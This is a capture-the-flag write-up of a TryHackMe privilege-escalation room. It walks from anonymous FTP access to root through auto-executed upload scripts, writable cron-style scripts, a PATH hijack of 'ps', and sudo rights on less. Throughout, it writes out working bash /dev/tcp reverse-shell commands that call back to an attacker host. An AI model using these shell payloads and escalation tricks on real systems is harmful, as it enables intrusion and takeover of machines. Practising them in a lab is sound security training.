Use privilege escalation knowledge to jump from a normal user to root.

![](../Assets/Jump/jumpicon.png)

> **Challenge Info**
> 
> Platform: TryHackMe
> 
> Category: Privilege escalation
> 
> CTF Link: https://tryhackme.com/room/jump

# recon_user
I begin the challenge by scanning the target with nmap:
```
┌──(kali㉿kali)-[~]
└─$ nmap $IP
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-18 14:28 -0400
Nmap scan report for 10.113.165.172
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

For now I'll checkout the FTP service:
```
┌──(kali㉿kali)-[~]
└─$ ftp $IP
Connected to 10.113.165.172.
220 (vsFTPd 3.0.5)
Name (10.113.165.172:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

After successfully logging in as `anonymous` I see what files I can download:
```
ftp> ls
229 Entering Extended Passive Mode (|||8080|)
150 Here comes the directory listing.
drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming
drwxr-xr-x    4 115      123          4096 Jun 09 08:22 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||26344|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             139 Feb 02 07:19 README.txt
drwxr-xr-x    2 115      123          4096 Feb 01 11:12 archive
drwxrwxrwx    2 115      123          4096 Feb 01 11:12 uploads
226 Directory send OK.
ftp> get README.txt
```

Reading the `README.txt` file:
```
┌──(kali㉿kali)-[~]
└─$ cat README.txt
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

This tells me I should upload a script into that folder where it should get executed automatically.

I make a reverse shell script:
```
#!/bin/bash

bash -i >& /dev/tcp/192.168.166.179/8080 0>&1
```

Put ncat into listening mode:
```
┌──(kali㉿kali)-[~]
└─$ ncat -lnp 8080
```
And I upload it to the `incoming` folder:
```
ftp> put shell.sh
local: shell.sh remote: shell.sh
229 Entering Extended Passive Mode (|||31740|)
150 Ok to send data.
100% |***********************************************************************************************|    59      171.99 KiB/s    00:00 ETA
226 Transfer complete.
59 bytes sent in 00:00 (0.64 KiB/s)
```

After a couple of moments I get my reverse shell:
```
recon_user@tryhackme-2404:~$ ls
ls
flag.txt
shell.sh
recon_user@tryhackme-2404:~$ cat flag.txt
cat flag.txt
THM{REDACTED}
```
# dev_user
I look for files owned by `dev_user`:
```
recon_user@tryhackme-2404:~$ find / -user dev_user 2>/dev/null
find / -user dev_user 2>/dev/null
/tmp/recon_backup.tgz
/opt/dev
/opt/dev/backup.sh
/opt/dev/bin
/opt/dev/bin/ps
/home/dev_user
/home/dev_user/flag.txt
/home/dev_user/.profile
/home/dev_user/.bashrc
/home/dev_user/.selected_editor
/home/dev_user/.local
/home/dev_user/.local/share
/home/dev_user/.bash_logout
```

I find and inspect `backup.sh`: 
```
recon_user@tryhackme-2404:/opt/dev$ cat backup.sh
cat backup.sh
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

It's a file that archives the home directory into a tar file, the file from the script already exists in the `tmp` folder. It's a safe guess that this script gets run periodically, to abuse this I append another reverse shell to it:
```
recon_user@tryhackme-2404:/opt/dev$ echo -E 'bash -i >& /dev/tcp/192.168.166.179/8081 0>&1' >> backup.sh
<>& /dev/tcp/192.168.166.179/8081 0>&1' >> backup.sh
```

And after connecting with ncat I get another shell:
```
┌──(kali㉿kali)-[~]
└─$ ncat -lnp 8081
bash: cannot set terminal process group (1598): Inappropriate ioctl for device
bash: no job control in this shell
dev_user@tryhackme-2404:~$ ls
ls
flag.txt
dev_user@tryhackme-2404:~$ cat flag.txt
cat flag.txt
THM{REDACTED}
```
# monitor_user
First thing I do as `dev_user` is check for files owned by `monitor_user`:
```
dev_user@tryhackme-2404:~$ find / -user monitor_user 2>/dev/null
```

I get *a bunch* of results: but the ones that catch my eye are:
```
/opt/app/data
/opt/app/deploy_helper.sh
/usr/local/bin/healthcheck
/home/monitor_user
/var/log/monitor.log
```

I take a peek inside the `monitor.log` file with a grep filter:
```
dev_user@tryhackme-2404:~$ cat /var/log/monitor.log | grep monitor
cat /var/log/monitor.log | grep monitor
monitor+   40593  0.0  0.0   7080  2048 ?        S    08:54   0:00 grep important_service
monitor+   40611  0.0  0.0   7080  2048 ?        S    08:55   0:00 grep important_service
monitor+   40646  0.0  0.0   7080  2048 ?        S    08:56   0:00 grep important_service
monitor+   40670  0.0  0.0   7080  2048 ?        S    08:57   0:00 grep important_service
monitor+   40687  0.0  0.0   7080  2048 ?        S    08:58   0:00 grep important_service
monitor+   40709  0.0  0.0   2800  1664 ?        Ss   08:59   0:00 /bin/sh -c PATH=/home/dev_user/bin:/usr/local/bin:/usr/bin /usr/local/bin/healthcheck >> /var/log/monitor.log 2>&1
monitor+   40715  0.0  0.0   7740  3200 ?        S    08:59   0:00 /bin/bash /usr/local/bin/healthcheck
monitor+   40718  100  0.1  11320  4224 ?        R    08:59   0:00 ps aux
monitor+   40732  0.0  0.0   2800  1664 ?        Ss   09:00   0:00 /bin/sh -c PATH=/home/dev_user/bin:/usr/local/bin:/usr/bin /usr/local/bin/healthcheck >> /var/log/monitor.log 2>&1
monitor+   40735  0.0  0.0   7740  3200 ?        S    09:00   0:00 /bin/bash /usr/local/bin/healthcheck
monitor+   40739  0.0  0.1  11320  4224 ?        R    09:00   0:00 ps aux
monitor+   40752  0.0  0.0   2800  1664 ?        Ss   09:01   0:00 /bin/sh -c PATH=/home/dev_user/bin:/usr/local/bin:/usr/bin /usr/local/bin/healthcheck >> /var/log/monitor.log 2>&1
monitor+   40755  0.0  0.0   7740  3200 ?        S    09:01   0:00 /bin/bash /usr/local/bin/healthcheck
monitor+   40759  0.0  0.1  11320  4352 ?        R    09:01   0:00 ps aux
monitor+   40783  0.0  0.0   2800  1664 ?        Ss   09:02   0:00 /bin/sh -c PATH=/home/dev_user/bin:/usr/local/bin:/usr/bin /usr/local/bin/healthcheck >> /var/log/monitor.log 2>&1
monitor+   40787  0.0  0.0   7740  3200 ?        S    09:02   0:00 /bin/bash /usr/local/bin/healthcheck
monitor+   40791  0.0  0.1  11320  4352 ?        R    09:02   0:00 ps aux
```

Looks like `monitor_user` uses the `healthcheck` script frequently. I inspect the script:
```
dev_user@tryhackme-2404:/usr/local/bin$ cat healthcheck
cat healthcheck
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

It looks like it's running indefinitely, I check `systemctl` and it does appear in there:
```
├─healthcheck.service
             │ ├─ 599 /bin/bash /usr/local/bin/healthcheck
             │ └─3768 sleep 
```

I inspect it deeper:
```
dev_user@tryhackme-2404:/usr/local/bin$ systemctl cat healthcheck.service
systemctl cat healthcheck.service
# /etc/systemd/system/healthcheck.service
[Unit]
Description=System Health Check

[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

It has a very unusual `PATH`, it prioritizes the `/opt/dev/bin` folder first for some reason.

To exploit that I will make a custom `ps` script there, because `healtcheck` didn't specify a path for `ps` the custom path should work. But when I get there, a `ps` script already exists:
```
dev_user@tryhackme-2404:/opt/dev/bin$ cat ps
cat ps
#!/bin/bash
setsid bash -i >& /dev/tcp/10.82.84.138/5557 0>&1
```
Probably a mistake by the CTF creator, I modify it with the correct IP and port:
```
dev_user@tryhackme-2404:/opt/dev/bin$ sed -i 's/10\.82\.84\.138/192.168.166.179/' ps
dev_user@tryhackme-2404:/opt/dev/bin$ chmod +x ps
chmod +x ps
```

And after setting up another ncat listener my reverse shell appears:
```
┌──(kali㉿kali)-[~]
└─$ ncat -lnp 5557
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
monitor_user@tryhackme-2404:/$ cd ~
cd ~
monitor_user@tryhackme-2404:~$ cat flag.txt
cat flag.txt
THM{REDACTED}
```
# opt_user
I look for files owned by `ops_user`:
```
monitor_user@tryhackme-2404:~$ find / -user ops_user 2>/dev/null
find / -user ops_user 2>/dev/null
/opt/app
/usr/local/bin/deploy.sh
/home/ops_user
```

I inspect the `deploy.sh` script:
```
monitor_user@tryhackme-2404:~$ cat /usr/local/bin/deploy.sh
cat /usr/local/bin/deploy.sh
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

I inspect `deploy_helper.sh`:
```
monitor_user@tryhackme-2404:~$ ls -l /opt/app
ls -l /opt/app
total 8
drwxrwxr-x 2 monitor_user monitor_user 4096 Feb  2 15:09 data
-rwxr-xr-x 1 monitor_user monitor_user   90 Feb  2 14:59 deploy_helper.sh
```

And it's actually owned by us, meaning I can append a reverse shell to it just like before:
```
monitor_user@tryhackme-2404:/opt/app$ echo -E 'bash -i >& /dev/tcp/192.168.166.179/8083 0>&1' >> deploy_helper.sh
</tcp/192.168.166.179/8083 0>&1' >> deploy_helper.sh
```

It doesn't look like this script gets run periodically, let's see if I can run it with higher permission myself:
```
monitor_user@tryhackme-2404:~$ sudo -l
sudo -l
User monitor_user may run the following commands on tryhackme-2404:
	(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

And I can! So that's exactly what I do:
```
monitor_user@tryhackme-2404:/opt/app$ sudo -u ops_user /usr/local/bin/deploy.sh
</opt/app$ sudo -u ops_user /usr/local/bin/deploy.sh
[+] Deploy helper running
[+] Syncing application files
```

I get my reverse shell:
```
┌──(kali㉿kali)-[~]
└─$ ncat -lnp 8083
bash: cannot set terminal process group (4428): Inappropriate ioctl for device
bash: no job control in this shell
ops_user@tryhackme-2404:/opt/app$ cd ~
cd ~
ops_user@tryhackme-2404:~$ cat flag.txt
cat flag.txt
THM{REDACTED}
```
# ops_user
My usual approach of using the `find` command won't work here, since for `root` it will just dump all the system files. Instead I use `sudo -l`:
```
ops_user@tryhackme-2404:~$ sudo -l
sudo -l
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

The only program we can execute with `root` permission is `less`, which is perfect actually, since we can read any restricted file now:
```
ops_user@tryhackme-2404:~$ sudo -u root less /root/flag.txt
sudo -u root less /root/flag.txt
THM{REDACTED}
```